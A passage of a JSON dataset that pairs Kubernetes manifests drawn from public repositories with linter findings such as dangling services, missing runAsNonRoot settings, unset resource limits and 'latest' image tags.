    "violation_text": "container \"lighthouse-tekton-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "11009",
    "manifest_path": "data/manifests/the_stack_sample/sample_4219.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: monitoring-grafana\n  namespace: kube-system\n  labels:\n    kubernetes.io/cluster-service: 'true'\n    addonmanager.kubernetes.io/mode: Reconcile\n    kubernetes.io/name: Grafana\nspec:\n  ports:\n  - port: 3000\n    protocol: TCP\n    targetPort: ui\n    nodePort: 30001\n  selector:\n    k8s-app: influxGrafana\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:influxGrafana])"
  },
  {
    "id": "11010",
    "manifest_path": "data/manifests/the_stack_sample/sample_4220.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: acrkeith.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "11011",
    "manifest_path": "data/manifests/the_stack_sample/sample_4220.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: acrkeith.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11012",
    "manifest_path": "data/manifests/the_stack_sample/sample_4220.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: acrkeith.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "11013",
    "manifest_path": "data/manifests/the_stack_sample/sample_4220.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: acrkeith.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "11014",
    "manifest_path": "data/manifests/the_stack_sample/sample_4220.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: acrkeith.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "11015",
    "manifest_path": "data/manifests/the_stack_sample/sample_4221.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kuard\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n    protocol: TCP\n  - name: https\n    port: 443\n    targetPort: 8443\n    protocol: TCP\n  selector:\n    app: kuard\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kuard])"
  },
  {
    "id": "11016",
    "manifest_path": "data/manifests/the_stack_sample/sample_4224.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteconsole\n  namespace: flyte\n  labels:\n    app: flyteconsole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteconsole\n  template:\n    metadata:\n      labels:\n        app: flyteconsole\n    spec:\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: flyteconsole\n        image: docker.io/lyft/flyteconsole:v0.1.0\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        envFrom:\n        - configMapRef:\n            name: flyte-console-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flyteconsole\" does not have a read-only root file system"
  },
  {
    "id": "11017",
    "manifest_path": "data/manifests/the_stack_sample/sample_4224.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteconsole\n  namespace: flyte\n  labels:\n    app: flyteconsole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteconsole\n  template:\n    metadata:\n      labels:\n        app: flyteconsole\n    spec:\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: flyteconsole\n        image: docker.io/lyft/flyteconsole:v0.1.0\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        envFrom:\n        - configMapRef:\n            name: flyte-console-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flyteconsole\" is not set to runAsNonRoot"
  },
  {
    "id": "11018",
    "manifest_path": "data/manifests/the_stack_sample/sample_4224.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteconsole\n  namespace: flyte\n  labels:\n    app: flyteconsole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteconsole\n  template:\n    metadata:\n      labels:\n        app: flyteconsole\n    spec:\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: flyteconsole\n        image: docker.io/lyft/flyteconsole:v0.1.0\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        envFrom:\n        - configMapRef:\n            name: flyte-console-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"flyteconsole\" has cpu request 0"
  },
  {
    "id": "11019",
    "manifest_path": "data/manifests/the_stack_sample/sample_4224.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flyteconsole\n  namespace: flyte\n  labels:\n    app: flyteconsole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flyteconsole\n  template:\n    metadata:\n      labels:\n        app: flyteconsole\n    spec:\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: flyteconsole\n        image: docker.io/lyft/flyteconsole:v0.1.0\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - name: shared-data\n          mountPath: /srv/flyte\n        envFrom:\n        - configMapRef:\n            name: flyte-console-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"flyteconsole\" has memory limit 0"
  },
  {
    "id": "11020",
    "manifest_path": "data/manifests/the_stack_sample/sample_4229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx:1.14\n    name: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11021",
    "manifest_path": "data/manifests/the_stack_sample/sample_4229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx:1.14\n    name: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11022",
    "manifest_path": "data/manifests/the_stack_sample/sample_4229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx:1.14\n    name: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11023",
    "manifest_path": "data/manifests/the_stack_sample/sample_4229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx:1.14\n    name: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11024",
    "manifest_path": "data/manifests/the_stack_sample/sample_4231.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-app-mongo\n  labels:\n    app: server-app-mongo\n    group: sample\n    version: kube-tests\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: server-app-mongo\n      group: sample\n      version: kube-tests\n  template:\n    metadata:\n      labels:\n        app: server-app-mongo\n        group: sample\n        version: kube-tests\n    spec:\n      containers:\n      - name: server-app-mongo\n        image: server-app-mongo:latest\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: server-app-mongo\n        - secretRef:\n            name: server-app-mongo\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 8090\n        resources:\n          limits:\n            cpu: 750m\n            memory: 512Mi\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server-app-mongo\" is using an invalid container image, \"server-app-mongo:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11025",
    "manifest_path": "data/manifests/the_stack_sample/sample_4231.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-app-mongo\n  labels:\n    app: server-app-mongo\n    group: sample\n    version: kube-tests\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: server-app-mongo\n      group: sample\n      version: kube-tests\n  template:\n    metadata:\n      labels:\n        app: server-app-mongo\n        group: sample\n        version: kube-tests\n    spec:\n      containers:\n      - name: server-app-mongo\n        image: server-app-mongo:latest\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: server-app-mongo\n        - secretRef:\n            name: server-app-mongo\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 8090\n        resources:\n          limits:\n            cpu: 750m\n            memory: 512Mi\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server-app-mongo\" does not have a read-only root file system"
  },
  {
    "id": "11026",
    "manifest_path": "data/manifests/the_stack_sample/sample_4231.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: server-app-mongo\n  labels:\n    app: server-app-mongo\n    group: sample\n    version: kube-tests\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: server-app-mongo\n      group: sample\n      version: kube-tests\n  template:\n    metadata:\n      labels:\n        app: server-app-mongo\n        group: sample\n        version: kube-tests\n    spec:\n      containers:\n      - name: server-app-mongo\n        image: server-app-mongo:latest\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: server-app-mongo\n        - secretRef:\n            name: server-app-mongo\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 8090\n        resources:\n          limits:\n            cpu: 750m\n            memory: 512Mi\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8090\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 3\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server-app-mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "11027",
    "manifest_path": "data/manifests/the_stack_sample/sample_4232.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myboot-demo\nspec:\n  containers:\n  - name: myboot-demo\n    image: quay.io/rhdevelopers/myboot:v4\n    volumeMounts:\n    - mountPath: /tmp/demo\n      name: demo-volume\n  volumes:\n  - name: demo-volume\n    hostPath:\n      path: /mnt/data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myboot-demo\" does not have a read-only root file system"
  },
  {
    "id": "11028",
    "manifest_path": "data/manifests/the_stack_sample/sample_4232.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myboot-demo\nspec:\n  containers:\n  - name: myboot-demo\n    image: quay.io/rhdevelopers/myboot:v4\n    volumeMounts:\n    - mountPath: /tmp/demo\n      name: demo-volume\n  volumes:\n  - name: demo-volume\n    hostPath:\n      path: /mnt/data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myboot-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "11029",
    "manifest_path": "data/manifests/the_stack_sample/sample_4232.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myboot-demo\nspec:\n  containers:\n  - name: myboot-demo\n    image: quay.io/rhdevelopers/myboot:v4\n    volumeMounts:\n    - mountPath: /tmp/demo\n      name: demo-volume\n  volumes:\n  - name: demo-volume\n    hostPath:\n      path: /mnt/data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myboot-demo\" has cpu request 0"
  },
  {
    "id": "11030",
    "manifest_path": "data/manifests/the_stack_sample/sample_4232.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myboot-demo\nspec:\n  containers:\n  - name: myboot-demo\n    image: quay.io/rhdevelopers/myboot:v4\n    volumeMounts:\n    - mountPath: /tmp/demo\n      name: demo-volume\n  volumes:\n  - name: demo-volume\n    hostPath:\n      path: /mnt/data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myboot-demo\" has memory limit 0"
  },
  {
    "id": "11031",
    "manifest_path": "data/manifests/the_stack_sample/sample_4233.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ${project.artifactId}\nspec:\n  selector:\n    cluster: ${project.artifactId}\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][cluster]: Invalid value: \"${project.artifactId}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "11032",
    "manifest_path": "data/manifests/the_stack_sample/sample_4234.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: dataspace-connector\n  name: dataspace-connector\nspec:\n  ports:\n  - name: http\n    port: 8080\n    targetPort: 8080\n  selector:\n    app: dataspace-connector\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:dataspace-connector])"
  },
  {
    "id": "11033",
    "manifest_path": "data/manifests/the_stack_sample/sample_4235.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: thefractalspace\nspec:\n  type: ClusterIP\n  selector:\n    app: thefractalspace\n    component: website\n  ports:\n  - name: http\n    port: 8000\n    targetPort: 8000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:thefractalspace component:website])"
  },
  {
    "id": "11034",
    "manifest_path": "data/manifests/the_stack_sample/sample_4236.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    hystrix.enabled: 'true'\n    provider: fabric8\n    demo.name: loanbroker\n    project: ${project.artifactId}\n    version: ${project.version}\n    group: io.fabric8.kubeflix.examples\n  name: loanbroker-broker\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    hystrix.enabled: 'true'\n    demo.name: loanbroker\n    project: loanbroker-broker\n    provider: fabric8\n    group: io.fabric8.kubeflix.examples\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[demo.name:loanbroker group:io.fabric8.kubeflix.examples hystrix.enabled:true project:loanbroker-broker provider:fabric8])"
  },
  {
    "id": "11035",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"token\" is using an invalid container image, \"quay.io/baijum/token:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11036",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"token\" does not have a read-only root file system"
  },
  {
    "id": "11037",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"chart-verifier-admin\" not found"
  },
  {
    "id": "11038",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"token\" is not set to runAsNonRoot"
  },
  {
    "id": "11039",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"token\" has cpu request 0"
  },
  {
    "id": "11040",
    "manifest_path": "data/manifests/the_stack_sample/sample_4237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    environment: prod\nspec:\n  selector:\n    matchLabels:\n      environment: prod\n  template:\n    metadata:\n      labels:\n        environment: prod\n    spec:\n      serviceAccountName: chart-verifier-admin\n      containers:\n      - name: token\n        image: quay.io/baijum/token:latest\n        ports:\n        - containerPort: 7080\n        volumeMounts:\n        - name: config\n          mountPath: /bindings\n      volumes:\n      - name: config\n        secret:\n          secretName: secret-github-repository\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"token\" has memory limit 0"
  },
  {
    "id": "11041",
    "manifest_path": "data/manifests/the_stack_sample/sample_4238.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: redis\n  labels:\n    app.kubernetes.io/name: redis\n  annotations:\n    keel.sh/policy: minor\n    keel.sh/trigger: poll\n    keel.sh/pollSchedule: '@daily'\n    keel.sh/approvals: '1'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: redis\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:6.2.5-alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        command:\n        - sh\n        args:\n        - -c\n        - redis-server --requirepass $REDIS_PASSWORD\n        ports:\n        - name: redis-port\n          protocol: TCP\n          containerPort: 6379\n        volumeMounts:\n        - name: redis-healthcheck\n          mountPath: /health\n        - name: redis-data\n          mountPath: /data\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_liveness.sh 5\n          initialDelaySeconds: 5\n          timeoutSeconds: 6\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_readiness.sh 1\n          initialDelaySeconds: 5\n          timeoutSeconds: 2\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        env:\n        - name: REDIS_PORT\n          value: '6379'\n        - name: REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secrets\n              key: redis_password\n      volumes:\n      - name: redis-healthcheck\n        configMap:\n          name: redis-healthcheck\n          defaultMode: 493\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "11042",
    "manifest_path": "data/manifests/the_stack_sample/sample_4238.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: redis\n  labels:\n    app.kubernetes.io/name: redis\n  annotations:\n    keel.sh/policy: minor\n    keel.sh/trigger: poll\n    keel.sh/pollSchedule: '@daily'\n    keel.sh/approvals: '1'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: redis\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:6.2.5-alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        command:\n        - sh\n        args:\n        - -c\n        - redis-server --requirepass $REDIS_PASSWORD\n        ports:\n        - name: redis-port\n          protocol: TCP\n          containerPort: 6379\n        volumeMounts:\n        - name: redis-healthcheck\n          mountPath: /health\n        - name: redis-data\n          mountPath: /data\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_liveness.sh 5\n          initialDelaySeconds: 5\n          timeoutSeconds: 6\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_readiness.sh 1\n          initialDelaySeconds: 5\n          timeoutSeconds: 2\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        env:\n        - name: REDIS_PORT\n          value: '6379'\n        - name: REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secrets\n              key: redis_password\n      volumes:\n      - name: redis-healthcheck\n        configMap:\n          name: redis-healthcheck\n          defaultMode: 493\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "11043",
    "manifest_path": "data/manifests/the_stack_sample/sample_4238.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: redis\n  labels:\n    app.kubernetes.io/name: redis\n  annotations:\n    keel.sh/policy: minor\n    keel.sh/trigger: poll\n    keel.sh/pollSchedule: '@daily'\n    keel.sh/approvals: '1'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: redis\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:6.2.5-alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n        command:\n        - sh\n        args:\n        - -c\n        - redis-server --requirepass $REDIS_PASSWORD\n        ports:\n        - name: redis-port\n          protocol: TCP\n          containerPort: 6379\n        volumeMounts:\n        - name: redis-healthcheck\n          mountPath: /health\n        - name: redis-data\n          mountPath: /data\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_liveness.sh 5\n          